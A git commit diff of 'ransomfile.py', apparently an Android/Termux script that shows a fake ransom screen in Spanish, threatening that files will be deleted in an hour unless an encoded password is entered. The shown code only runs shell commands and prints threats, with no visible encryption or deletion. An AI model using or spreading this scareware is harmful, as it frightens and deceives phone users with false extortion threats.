4678e5d9cac8882895e691b22503f82c94f1a6c6
VWolf <58598786+VWolf13@users.noreply.github.com>
2020-04-03 00:52:13 +0200

    Update ransomfile.py

--- ransomfile.py
+++ ransomfile.py
@@ -1,7 +1,7 @@
 import os
 os.system('pkg install storage')
 os.system('clear')
-print("\x1b[1;33m"+"\n\n\nLa pass se encuentra aquí (cifrada), por favor decifrala para poder desbloquear su celular ^^")
+print("\x1b[1;33m"+"\n\n\nLa pass se encuentra aquí (cifrada), decifrala para poder desbloquear su celular ^^")
 print("\n\n|>Pass: aW5zaWVydGUgZWwgbsO6bWVybyA1") 
 print("\x1b[1;31m"+"\n\n\n          --------Solo tiene un intento--------") 
 vw = input("\x1b[1;32m"+"\n\n|>Tus archivos serán eliminados en 1h, por favor introduce la pass necesaria para desbloquearlos: ")
